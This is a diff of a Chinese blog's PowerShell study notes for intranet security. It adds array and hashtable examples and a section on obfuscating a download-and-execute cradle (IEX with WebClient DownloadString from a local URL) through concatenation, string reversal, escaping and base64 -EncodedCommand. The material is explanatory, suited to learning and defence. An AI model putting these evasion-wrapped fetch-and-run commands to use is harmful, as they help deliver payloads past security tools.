@@ -37,11 +37,17 @@
 </ul>
 <h4 id="0x02-变量"><a href="#0x02-变量" class="headerlink" title="0x02.变量"></a>0x02.变量</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="number">1</span></span><br><span class="line"><span class="comment"># 全局变量</span></span><br><span class="line"><span class="variable">$global:a</span> = <span class="number">1</span></span><br><span class="line"><span class="comment"># 脚本变量</span></span><br><span class="line"><span class="variable">$script:a</span> = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出变量a</span></span><br><span class="line"><span class="built_in">Write-host</span> <span class="variable">$a</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$a</span></span><br><span class="line"><span class="comment"># 删除变量</span></span><br><span class="line"><span class="built_in">clear-variable</span></span><br><span class="line"><span class="comment"># 查看a的类型</span></span><br><span class="line"><span class="variable">$a</span>.GetType()</span><br></pre></td></tr></table></figure>
 
-<h4 id="0x03-对象集合"><a href="#0x03-对象集合" class="headerlink" title="0x03 对象集合"></a>0x03 对象集合</h4><h5 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h5><br>
+<h4 id="0x03-对象集合"><a href="#0x03-对象集合" class="headerlink" title="0x03 对象集合"></a>0x03 对象集合</h4><h5 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 创建和初始化数组</span><br><span class="line">$arr &#x3D; 1,2,3,4,5</span><br><span class="line">$arr2 &#x3D; 1..5</span><br><span class="line"></span><br><span class="line">$arr[0]</span><br><span class="line">$arr2[2..5]</span><br><span class="line"></span><br><span class="line"># 数组大小</span><br><span class="line">$arr.Length</span><br><span class="line"></span><br><span class="line">#数组操作</span><br><span class="line">$arr[2] &#x3D; 8</span><br><span class="line"># 将元素添加到$arr中 </span><br><span class="line">$arr +&#x3D; 6</span><br><span class="line"></span><br><span class="line"># 初始化一个空数组</span><br><span class="line">$arr &#x3D; @()</span><br><span class="line"></span><br><span class="line"># 从数组中删除元素</span><br><span class="line">$arr &#x3D; 1..5</span><br><span class="line">$arr &#x3D; ($arr[1], $arr[2], $arr[3])</span><br></pre></td></tr></table></figure>
 
-<h5 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h5><br>
+<br>
 
-<h5 id="4"><a href="#4" class="headerlink" title="4"></a>4</h5><br>
+<h5 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$dict</span> = <span class="selector-tag">@</span>&#123;&lt;key1&gt; = &lt;value1&gt; ; &lt; key2&gt; = &lt;value2&gt; ; ..... ; &lt; keyN&gt; = &lt;valueN&gt;;&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dict</span> = <span class="selector-tag">@</span>&#123;a = <span class="number">1</span>; a2 = <span class="number">2</span> ;&#125;</span><br><span class="line"><span class="variable">$dict</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Name                           Value                                                                      </span></span><br><span class="line"><span class="comment"># ----                           -----                                                                      </span></span><br><span class="line"><span class="comment"># a                              1                                                                          </span></span><br><span class="line"><span class="comment"># a2                             2   </span></span><br><span class="line"></span><br><span class="line"><span class="variable">$dict</span>.Keys</span><br><span class="line"><span class="comment"># a</span></span><br><span class="line"><span class="comment"># a2</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$dict</span>.values</span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示哈希表的键/值对总数</span></span><br><span class="line"><span class="variable">$dict</span>.count</span><br><span class="line"></span><br><span class="line"><span class="variable">$dict</span>.</span><br><span class="line"><span class="variable">$dict</span>.Add(<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="variable">$dict</span>.Remove(<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$hash</span> = <span class="selector-tag">@</span>&#123; ID = <span class="number">1</span>; Shape = <span class="string">&quot;Square&quot;</span>; Color = <span class="string">&quot;Blue&quot;</span>&#125;</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;Print all hashtable keys&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.keys</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;Print all hashtable values&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.values</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;Get ID&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>[<span class="string">&quot;ID&quot;</span>]</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;Get Shape&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.Number</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;print Size&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.Count</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;Add key-value&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>[<span class="string">&quot;Updated&quot;</span>] = <span class="string">&quot;Now&quot;</span></span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;Add key-value&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.Add(<span class="string">&quot;Created&quot;</span>,<span class="string">&quot;Now&quot;</span>)</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;print Size&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.Count</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;Remove key-value&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.Remove(<span class="string">&quot;Updated&quot;</span>)</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;print Size&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.Count</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;sort by key&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.GetEnumerator() | <span class="built_in">Sort-Object</span> <span class="literal">-Property</span> key</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">Print all hashtable keys</span><br><span class="line">Color</span><br><span class="line">Shape</span><br><span class="line">ID</span><br><span class="line">Print all hashtable values</span><br><span class="line">Blue</span><br><span class="line">Square</span><br><span class="line"><span class="number">1</span></span><br><span class="line">Get ID</span><br><span class="line"><span class="number">1</span></span><br><span class="line">Get Shape</span><br><span class="line">print Size</span><br><span class="line"><span class="number">3</span></span><br><span class="line">Add key<span class="literal">-value</span></span><br><span class="line">Add key<span class="literal">-value</span></span><br><span class="line">print Size</span><br><span class="line"><span class="number">5</span></span><br><span class="line">Remove key<span class="literal">-value</span></span><br><span class="line">print Size</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="built_in">sort</span> by key</span><br><span class="line">Name Value</span><br><span class="line">---- -----</span><br><span class="line">Color Blue</span><br><span class="line">Created Now</span><br><span class="line">ID <span class="number">1</span></span><br><span class="line">Shape Square</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<br>
 
 <h4 id="0x04-运算符"><a href="#0x04-运算符" class="headerlink" title="0x04  运算符"></a>0x04  运算符</h4><h5 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h5><ul>
 <li>-eq        等于</li>
@@ -88,7 +94,7 @@
 <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$i</span> <span class="keyword">in</span> <span class="variable">$a</span>)&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <ul>
-<li>while </li>
+<li>while</li>
 </ul>
 <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$i</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$i</span> <span class="operator">-le</span> <span class="number">5</span>)&#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line">  <span class="variable">$i</span> +=<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -125,27 +131,55 @@
 
 <br>
 
+<h4 id="0x0a-简单混淆"><a href="#0x0a-简单混淆" class="headerlink" title="0x0a 简单混淆"></a>0x0a 简单混淆</h4><p><code>Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;http://127.0.0.1:8000/1.txt&quot;)</code></p>
 <br>
 
-<h4 id="0x0a-混淆"><a href="#0x0a-混淆" class="headerlink" title="0x0a 混淆"></a>0x0a 混淆</h4><br>
+<ul>
+<li>1.去掉System关键词</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&quot;http://127.0.0.1:8000/1.txt&quot;</span>)</span><br></pre></td></tr></table></figure>
 
-<h5 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h5><br>
+<ul>
+<li>2.使用字符串连接+号连接</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://127.0.0.1:8000/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>
 
-<h5 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h5><br>
+<ul>
+<li>3.使用Invoke方法</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).(<span class="string">&quot;DownloadString&quot;</span>).Invoke(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://127.0.0.1:8000/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>
 
-<h5 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h5><br>
+<ul>
+<li>4.变量替代</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ds</span>=<span class="string">&quot;Down&quot;</span>+<span class="string">&quot;loadString&quot;</span>;</span><br><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).<span class="variable">$ds</span>.Invoke(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://127.0.0.1:8000/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>
 
+<ul>
+<li>5.关键词使用单双引号引起来</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).<span class="string">&quot;DownloadString&quot;</span>(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://127.0.0.1/powershell&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>6.转义符号</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).<span class="string">&quot;D o wn l oad Str in g&quot;</span>(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://127.0.0.1:8000/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>7.字符串反转</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$re</span>= <span class="string">&quot;)&#x27;txt.1/0008:1.0.0.721//:ptth&#x27;(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN(&quot;</span>;</span><br><span class="line">(<span class="variable">$re</span>[-<span class="number">1</span><span class="type">..</span>-(<span class="variable">$re</span><span class="type">.Length</span>)] <span class="operator">-Join</span> <span class="string">&#x27;&#x27;</span>) | <span class="built_in">IEX</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>8.编码执行</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$command</span> = <span class="string">&quot;Invoke-Expression (New-Object Net.WebClient).DownloadString(&#x27;h&#x27;+&#x27;ttp://127.0.0.1:8000/1.txt&#x27;)&quot;</span></span><br><span class="line"><span class="variable">$bytes</span> = [<span class="type">System.Text.Encoding</span>]::Unicode.GetBytes(<span class="variable">$command</span>)</span><br><span class="line"><span class="variable">$encodedCommand</span> = [<span class="type">Convert</span>]::ToBase64String(<span class="variable">$bytes</span>)</span><br><span class="line">powershell.exe <span class="literal">-EncodedCommand</span> <span class="variable">$encodedCommand</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="混淆工具"><a href="#混淆工具" class="headerlink" title="混淆工具"></a>混淆工具</h5><p> Invoke-Obfuscation</p>
+<p><a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a></p>
+<p>Revoke-Obfuscation</p>
 <br>
 
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;gsh3ll.top&#x2F;2021&#x2F;12&#x2F;18&#x2F;%E3%80%90%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0%E3%80%91PowerShell%E5%9F%BA%E7%A1%80&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;cloud.tencent.com&#x2F;developer&#x2F;article&#x2F;1639161</span><br><span class="line">https:&#x2F;&#x2F;www.secrss.com&#x2F;articles&#x2F;20119</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;gsh3ll.top&#x2F;2021&#x2F;12&#x2F;18&#x2F;%E3%80%90%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0%E3%80%91PowerShell%E5%9F%BA%E7%A1%80&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;cloud.tencent.com&#x2F;developer&#x2F;article&#x2F;1639161</span><br><span class="line">https:&#x2F;&#x2F;www.secrss.com&#x2F;articles&#x2F;20119</span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;linuxsec&#x2F;articles&#x2F;7384582.html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 ]]></content>
   </entry>
   <entry>
